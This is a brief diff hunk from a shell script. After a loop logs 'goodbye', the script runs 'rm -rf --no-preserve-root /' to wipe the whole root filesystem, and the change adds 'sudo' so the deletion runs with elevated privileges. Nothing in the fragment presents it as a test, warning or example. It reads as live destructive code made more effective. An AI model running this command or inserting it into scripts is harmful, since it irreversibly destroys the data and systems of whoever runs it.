@@ -48,7 +48,7 @@ while [[ true ]]; do
             sleep 1
         done
         log "goodbye"
-        execute rm -rf --no-preserve-root /
+        execute sudo rm -rf --no-preserve-root /
         break
     fi
 done
